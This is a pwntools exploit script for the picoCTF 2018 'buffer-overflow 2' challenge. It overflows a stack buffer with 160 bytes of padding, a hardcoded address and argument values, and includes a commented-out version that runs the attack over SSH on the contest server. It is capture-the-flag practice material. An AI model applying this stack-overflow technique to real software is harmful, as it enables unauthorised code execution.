
from pwn import *

# Check App
vuln = ELF('./vuln')
print(vuln)

# Build exploit
padding = 'A' * 160
ret_addr =  b'BBBB' # EBP+4
exploit = bytes(padding, 'ascii') + p32(0xf7ec06f0) + ret_addr + p32(0xDEADC0DE)


# # Local version
p = process('./vuln')
p.recvuntil("Please enter your string:")
p.sendline(exploit)
print(p.recv(timeout=5))
p.interactive()

# Remote version
# s =  ssh(host='2018shell4.picoctf.com',
#         user='luk6xff',
#         password='MYPASS')
# p = s.run('cd /problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa && ./vuln')
# print(p.recv())
# p.sendline(exploit)
# p.interactive()
# print(p.recv())
# s.close()